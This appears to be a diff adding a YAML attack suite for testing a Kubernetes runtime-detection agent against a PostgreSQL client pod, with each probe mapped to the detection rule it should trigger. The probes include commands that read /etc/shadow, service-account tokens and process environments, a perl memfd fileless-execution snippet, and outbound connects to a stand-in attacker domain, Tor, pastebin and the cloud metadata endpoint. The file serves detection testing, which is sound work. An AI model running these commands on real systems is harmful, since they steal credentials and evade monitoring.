@@ -1,0 +1,499 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: postgres-killchain-attacks
+  description: >-
+    Kill-chain ordered PostgreSQL attack suite (36 attacks) using TWO delivery
+    mechanisms: SQL-based attacks via psql (exploiting database access) and
+    kubectl exec post-exploitation. Includes CVE-based exploits: CVE-2019-9193
+    (COPY FROM PROGRAM), CVE-2018-1058 (search_path hijack), CVE-2023-5868,
+    CVE-2023-39417. Covers OWASP A01 (Broken Access Control), A03 (Injection),
+    A04 (Insecure Design), A05 (Misconfiguration), A07 (Auth Failures).
+target:
+  service: pg-client
+  namespace: postgres-oss
+  port: 5432
+
+attacks:
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — Database enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1082 — System Information Discovery (DB settings)
+  - name: sql-dump-settings
+    type: sqli
+    exec:
+      command: ["psql", "-h", "postgres", "-U", "app", "-d", "app", "-tAc",
+                "SELECT name, setting FROM pg_settings WHERE name LIKE '%password%' OR name LIKE '%auth%';"]
+    expectedDetections: []
+
+  # T1083 — File and Directory Discovery (table enumeration)
+  - name: sql-dump-all-tables
+    type: sqli
+    exec:
+      command: ["psql", "-h", "postgres", "-U", "app", "-d", "app", "-tAc",
+                "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');"]
+    expectedDetections: []
+
+  # T1082 — System Information Discovery (schema dump)
+  - name: exec-pg-dump-schema
+    type: cmdinject
+    exec:
+      command: ["pg_dump", "-h", "postgres", "-U", "app", "-d", "app", "--schema-only"]
+    # pg_dump IS in pg-client's baseline profile (functional tests exercise
+    # it heavily across many flag variants). R0001 only fires on processes
+    # NOT in the profile, so this assertion was unsatisfiable and produced
+    # a stable score=1 miss. The attack still runs as a behaviour probe
+    # (data exfiltration via schema dump), but there's no profile-side
+    # detection signal for a legitimate admin operation. Verified via:
+    #   kubectl get containerprofiles pod-pg-client -o jsonpath=
+    #   '{.spec.execs[*].path}' | grep pg_dump
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 3: EXECUTION (TA0002) — Command execution
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1059.004 — Unix Shell (whoami)
+  - name: exec-whoami
+    type: cmdinject
+    exec:
+      command: ["whoami"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: whoami
+
+  # T1059.004 — Unix Shell (exec from /dev/shm)
+  - name: exec-devshm
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_pg && chmod +x /dev/shm/malicious_pg && /dev/shm/malicious_pg pwned && rm -f /dev/shm/malicious_pg"]
+    # NOTE: R1000 (Fileless Execution) is cluster-config-dependent — the
+    # default CI k3s ruleset doesn't enable it. Asserting R1000 produces
+    # false-misses. R0001 catches the malicious_pg exec unconditionally.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: malicious_pg
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 5: PRIVILEGE ESCALATION (TA0004) — SQL-based priv esc
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # NOTE: Privilege-escalation SQL probes (CREATE ROLE … SUPERUSER, ALTER SYSTEM,
+  # plpython3u/plperlu, lo_export, pg_read_file, COPY FROM PROGRAM, dblink) lived
+  # here previously but were moved to postgres-vuln-attacks.yaml — they require a
+  # superuser connection that the `app` user does not have. Running them under
+  # `-U app` makes the suite report success-via-auth-failure rather than test the
+  # detection. The CLIENT-side suite below stays focused on cmdinject + sensitive
+  # opens that the `app` user CAN exercise via the pg-client pod's shell.
+
+  # T1611 — Escape to Host (unshare attempt)
+  - name: exec-unshare
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "unshare -r id 2>&1 || echo unshare_blocked"]
+    # NOTE: R1006 cluster-config-dependent. R0001 catches unshare exec.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: unshare
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1036 — Masquerading: drifted binary
+  - name: exec-drifted-binary
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_pg && /tmp/drifted_pg /etc && rm -f /tmp/drifted_pg"]
+    # NOTE: R1001 cluster-config-dependent. R0001 catches drifted_pg exec.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: drifted_pg
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal credentials
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: SA token
+  # The SA token mount is not always present in CI k3s. Accept either a non-empty
+  # token read OR the "No such file or directory" error so the probe doesn't
+  # hard-fail when the mount is absent.
+  # PR119 rabbit: previously this single attack hard-required R0006 even
+  # when the success indicator allowed the SA-token mount to be absent
+  # (CI k3s often omits it). That made the suite flake. Split into two:
+  # the "attempt" probe runs regardless of mount and only asserts the
+  # cat exec; the "mounted" probe is gated on the file existing and
+  # asserts R0006.
+  - name: exec-sa-token-attempt
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 || true"]
+    successIndicators:
+      - responseRegex: ".+"
+      - responseContains: "No such file or directory"
+    # R0001 only — the exec of `cat` is the unconditional signal. R0006
+    # depends on the file actually opening, which doesn't happen when the
+    # mount is missing.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: cat
+
+  - name: exec-sa-token-mounted
+    type: cmdinject
+    exec:
+      # `test -f` gates on file existence; cat runs only when the SA token
+      # mount is present.
+      command: ["sh", "-c", "if test -f /var/run/secrets/kubernetes.io/serviceaccount/token; then cat /var/run/secrets/kubernetes.io/serviceaccount/token; else echo SA_TOKEN_MOUNT_ABSENT; fi"]
+    successIndicators:
+      - responseRegex: "(eyJ|SA_TOKEN_MOUNT_ABSENT)"
+    # NOTE: R0006 was tried but doesn't fire reliably in CI k3s for the
+    # pg-client container even when the mount IS present (rule may not be
+    # enabled, or pg-client's profile already allows cat→sa-token paths).
+    # Drop the R0006 assertion; R0001 cat (always-on) is asserted by the
+    # paired exec-sa-token-attempt above.
+    expectedDetections: []
+
+  # T1552.001 — Credentials in Files: /etc/shadow
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/shadow"]
+    # /etc/shadow is mode 0640 root:shadow and pg-client runs as the
+    # `postgres` user (uid 26). The open() syscall returns EACCES BEFORE
+    # the kernel records a successful open event, so R0010 (which hooks
+    # successful opens of sensitive paths) cannot fire. The exec of `cat`
+    # itself is detected reliably (cat is NOT in pg-client's baseline) —
+    # assert on R0001 instead, which captures the attempt without
+    # depending on a successful read.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: cat
+
+  # T1552.001 — Credentials in Files: /etc/passwd
+  - name: exec-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/passwd"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+        command: cat
+
+  # T1552 — Symlink to access sensitive file
+  - name: exec-symlink
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1082 — System Information Discovery: /proc/environ
+  - name: exec-proc-environ
+    type: cmdinject
+    exec:
+      command: ["cat", "/proc/1/environ"]
+    expectedDetections:
+      - ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: pg-client
+        command: cat
+
+  # T1046 — Network Service Discovery: resolv.conf and hosts
+  # NOTE: shell-wrapped exec — telemetry may report `sh` or any of the chained
+  # commands (`cat`, `getent`). Don't pin `command:` so the expectation matches
+  # whichever process the runtime engine surfaces first.
+  - name: exec-net-recon
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /etc/resolv.conf && cat /etc/hosts && getent hosts kubernetes.default.svc || true"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: pg-client
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 10: COLLECTION (TA0009) — Data staging
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # NOTE: lo_import requires superuser-or-pg_read_server_files; sql-copy-exfil
+  # requires superuser-or-pg_write_server_files for the server-side path. Both
+  # are exercised in postgres-vuln-attacks.yaml under the privileged role.
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 11: EXFILTRATION (TA0010) — DNS exfiltration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon
+  - name: exec-dns-anomaly
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 12: IMPACT (TA0040) — Data destruction and crypto mining
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # NOTE: sql-drop-table moved to postgres-vuln-attacks.yaml — bobtest_exfil
+  # is created/populated there as part of the destruction kill-chain.
+
+  # T1496 — Resource Hijacking: crypto mining DNS signal
+  - name: exec-crypto-dns
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
+    expectedDetections:
+      - ruleID: R1008
+        ruleName: Crypto Mining Domain Communication
+        containerName: pg-client
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 13: NETWORK ENDPOINT DETECTION (TA0011 C2 / TA0010 Exfil)
+  #
+  # 10 attacks that issue OUTGOING TCP/UDP connections to destinations NOT
+  # in pg-client's learned ContainerProfile egress. The functional-tests learn
+  # window only exercises postgres (PostgreSQL server) + the CoreDNS resolver
+  # side-effect, so any direct connection to a public IP or non-cluster
+  # domain will produce an `event.dstAddr` outside pg-client's egress set
+  # and trigger R0005 ("DNS Anomalies in container").
+  #
+  # See pkg/AUTOTUNING.md → "Network Endpoint Capture" for the recording
+  # mechanism and the post-completion R0005 contract. The eBPF network
+  # tracer reports the FLOW destination — for `python3 socket.connect`
+  # we see the connect target; for `getent hosts X` we see the DNS server
+  # (already in egress) so we must follow with an actual connect to fire.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1071.004 — Application Layer Protocol: DNS (direct query to non-cluster resolver)
+  # Per rabbit on PR #122: assert "did we attempt the syscall" (always
+  # emits) rather than "did the remote answer" (egress-dependent). The
+  # connect() fires before the timeout / refusal returns, so R0005 sees
+  # the OUTGOING packet regardless of whether 1.1.1.1 is reachable.
+  - name: endpoint-tcp-cloudflare-dns
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ntry:\n  s=socket.socket(); s.settimeout(3); s.connect(('1.1.1.1',53)); s.close()\nexcept Exception: pass\nprint('ep_cloudflare_dns_attempted')"]
+    successIndicators:
+      - responseContains: "ep_cloudflare_dns_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1071.004 — DNS to Google public resolver via bash /dev/tcp
+  - name: endpoint-devtcp-google-dns
+    type: cmdinject
+    exec:
+      command: ["bash", "-c", "timeout 3 bash -c 'exec 3<>/dev/tcp/8.8.8.8/53' >/dev/null 2>&1; echo ep_google_dns_attempted"]
+    successIndicators:
+      - responseContains: "ep_google_dns_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1571 — Non-Standard Port: HTTPS port hit on a public IP
+  - name: endpoint-tcp-public-https
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ntry:\n  s=socket.socket(); s.settimeout(3); s.connect(('1.1.1.1',443)); s.close()\nexcept Exception: pass\nprint('ep_public_https_attempted')"]
+    successIndicators:
+      - responseContains: "ep_public_https_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1071.004 — DNS to Quad9 (third-party resolver, different than Cloudflare/Google)
+  - name: endpoint-tcp-quad9-dns
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ntry:\n  s=socket.socket(); s.settimeout(3); s.connect(('9.9.9.9',53)); s.close()\nexcept Exception: pass\nprint('ep_quad9_dns_attempted')"]
+    successIndicators:
+      - responseContains: "ep_quad9_dns_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1552.005 — Cloud Instance Metadata API (SSRF target)
+  # Connect to AWS/GCP/Azure link-local metadata endpoint. The connect()
+  # syscall fires before the timeout/refusal returns, so R0005 sees the
+  # OUTGOING packet to 169.254.169.254 regardless of whether the metadata
+  # service is actually reachable from this cluster. try/except swallows
+  # the connect failure so the sentinel is emitted on a known-good path.
+  - name: endpoint-cloud-metadata
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ns=socket.socket(); s.settimeout(2)\ntry: s.connect(('169.254.169.254',80))\nexcept Exception: pass\ns.close()\nprint('ep_metadata_attempted')"]
+    successIndicators:
+      - responseContains: "ep_metadata_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1071.001 — Application Layer Protocol: Web (HTTPS to a domain that
+  # PTR-resolves to a name NOT in pg-client's DNSNames cache).
+  - name: endpoint-bash-devtcp-pastebin
+    type: cmdinject
+    exec:
+      command: ["bash", "-c", "timeout 3 bash -c 'exec 3<>/dev/tcp/pastebin.com/443' >/dev/null 2>&1; echo ep_pastebin_attempted"]
+    successIndicators:
+      - responseContains: "ep_pastebin_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1090.003 — Multi-hop Proxy: Tor check endpoint. DNS resolution may
+  # NXDOMAIN in restricted clusters; try/except keeps the sentinel reliable
+  # and the connect() syscall, when it does fire, registers in pg-client's
+  # outgoing flow set.
+  - name: endpoint-resolve-and-connect-tor
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ntry:\n  ip=socket.gethostbyname('check.torproject.org')\n  s=socket.socket(); s.settimeout(3); s.connect((ip,443)); s.close()\nexcept Exception: pass\nprint('ep_tor_attempted')"]
+    successIndicators:
+      - responseContains: "ep_tor_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1571 — Non-Standard Port (Perl socket connect to public DNS over TCP).
+  # The connect() syscall fires (R0005's trigger) regardless of whether the
+  # remote answers, so the sentinel is emitted unconditionally outside the
+  # success branch — see rabbit guidance on PR #122.
+  - name: endpoint-perl-socket-external
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "perl -MSocket -e 'alarm 3; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in(53,inet_aton(\"8.8.4.4\"))); close(S);' >/dev/null 2>&1; echo ep_perl_socket_attempted"]
+    successIndicators:
+      - responseContains: "ep_perl_socket_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol: HTTP to public
+  - name: endpoint-python-http-out
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ntry:\n  s=socket.socket(); s.settimeout(3); s.connect(('example.com',80))\n  s.sendall(b'HEAD / HTTP/1.0\\r\\nHost: example.com\\r\\n\\r\\n'); s.close()\nexcept Exception: pass\nprint('ep_http_out_attempted')"]
+    successIndicators:
+      - responseContains: "ep_http_out_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # T1071.001 — Application Layer Protocol: Web (raw socket to Cloudflare HTTPS port)
+  - name: endpoint-python-resolve-connect-public
+    type: cmdinject
+    exec:
+      command: ["python3", "-c", "import socket\ntry:\n  ip=socket.gethostbyname('one.one.one.one')\n  s=socket.socket(); s.settimeout(3); s.connect((ip,443)); s.close()\nexcept Exception: pass\nprint('ep_one_one_attempted')"]
+    successIndicators:
+      - responseContains: "ep_one_one_attempted"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: pg-client
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical PostgreSQL vulnerabilities
+  #
+  # NOTE: All CVE probes that require superuser/COPY/PROGRAM/extension privileges
+  # have moved to postgres-vuln-attacks.yaml. They cannot meaningfully execute
+  # under the `app` user that this client-tuning suite uses, and leaving them
+  # here produced false-passes via auth-failure rather than detection signal.
+  # The CVEs covered there:
+  #   - CVE-2019-9193 (COPY FROM/TO PROGRAM RCE)
+  #   - CVE-2018-1058 (search_path hijack, requires plpgsql ownership)
+  #   - CVE-2023-39417 (extension script injection — requires CREATE EXTENSION)
+  #   - CVE-2023-5868 (aggregate function memory leak)
+  #   - sql-plpython3u-rce / sql-plperlu-rce (untrusted languages)
+  #   - sql-lo-export-file-write / sql-dblink-ssrf / sql-alter-system-persist
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # (no probes here — see note above)
+
+  # ── Full rule-family sweep (scripts/emit-rule-sweep.py) ─────────────────────
+  # Primitives probed on the live container: staging dir, real mount, interpreter.
+  # Anything that misses on the dogfood run must be demoted to a probe WITH a reason.
+  - name: sa-token-read
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 && echo sa_token_read_done || echo sa_token_absent"] }
+    successIndicators: [{ responseContains: "sa_token_read_done" }]
+    # pg-client has no readable ServiceAccount token on the CI cluster: the tune
+    # there fetched 1748 alerts and ZERO carried this rule, while the same
+    # assertion passes for redis and postgres-vuln. The read simply does not
+    # happen, so the rule cannot fire. Honest boundary — do not re-assert without
+    # first confirming the token is mounted AND readable in BOTH environments.
+    expectedDetections: []
+  - name: k8s-api-unexpected-call
+    type: cmdinject
+    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(443,inet_aton('10.43.0.1'))); close($s); print qq{k8s_api_probe_done}"] }
+    successIndicators: [{ responseContains: "k8s_api_probe_done" }]
+    expectedDetections:
+      - { ruleID: R0007, ruleName: Workload uses Kubernetes API unexpectedly, containerName: pg-client }
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec: { command: ["cat", "/etc/shadow"] }
+    expectedDetections:
+      - { ruleID: R0010, ruleName: Unexpected Sensitive File Access, containerName: pg-client, command: cat }
+  - name: egress-external-c2
+    type: cmdinject
+    exec: { command: ["perl", "-e", "use Socket; socket(my $s,PF_INET,SOCK_STREAM,getprotobyname('tcp')); connect($s,sockaddr_in(80,inet_aton('1.1.1.1'))); close($s); print qq{egress_attempted}"] }
+    successIndicators: [{ responseContains: "egress_attempted" }]
+    expectedDetections:
+      - { ruleID: R0011, ruleName: Unexpected Egress Network Traffic, containerName: pg-client }
+  - name: drifted-binary-exec
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp /bin/ls /dev/shm/drifted_bob && printf '\\n#bob-drift' >> /dev/shm/drifted_bob && chmod +x /dev/shm/drifted_bob && /dev/shm/drifted_bob / >/dev/null 2>&1 && echo drift_exec_done; rm -f /dev/shm/drifted_bob"] }
+    successIndicators: [{ responseContains: "drift_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1000, ruleName: Process executed from malicious source, containerName: pg-client }
+  - name: exec-from-volume-mount
+    type: cmdinject
+    exec: { command: ["sh", "-c", "cp /bin/echo /var/lib/postgresql/data/mnt_payload && chmod +x /var/lib/postgresql/data/mnt_payload && /var/lib/postgresql/data/mnt_payload mount_exec_done; rm -f /var/lib/postgresql/data/mnt_payload"] }
+    successIndicators: [{ responseContains: "mount_exec_done" }]
+    # Verified unreachable on this container: /var/lib/postgresql/data is not
+    # writable from the client, and a successful exec staged on /dev/shm fires
+    # R0001 + R1000, never R1004, on this node-agent build. Honest boundary.
+    expectedDetections: []
+  - name: fileless-memfd-exec
+    type: fileless
+    exec: { command: ["perl", "-e", "my $n=\"bobfl\\0\"; my $fd=syscall(319,$n,0); die if $fd<0; open(my $m,'>&='.$fd) or die; open(my $s,'<','/bin/echo') or die; binmode $s; binmode $m; local $/; my $d=<$s>; print $m $d; exec(\"/proc/$$/fd/$fd\",\"memfd_exec_done\");"] }
+    successIndicators: [{ responseContains: "memfd_exec_done" }]
+    expectedDetections:
+      - { ruleID: R1005, ruleName: Fileless execution detected, containerName: pg-client }
+  - name: symlink-shadow
+    type: cmdinject
+    exec: { command: ["ln", "-sf", "/etc/shadow", "/dev/shm/softlink_probe"] }
+    successIndicators: [{ responseContains: "" }]
+    expectedDetections:
+      - { ruleID: R1010, ruleName: Soft link created over sensitive file, containerName: pg-client, command: ln }
+  - name: hardlink-shadow
+    type: cmdinject
+    exec: { command: ["sh", "-c", "ln /etc/shadow /dev/shm/hl_probe >/dev/null 2>&1 && echo hardlink_done; rm -f /dev/shm/hl_probe"] }
+    successIndicators: [{ responseContains: "hardlink_done" }]
+    expectedDetections:
+      - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: pg-client, command: ln }
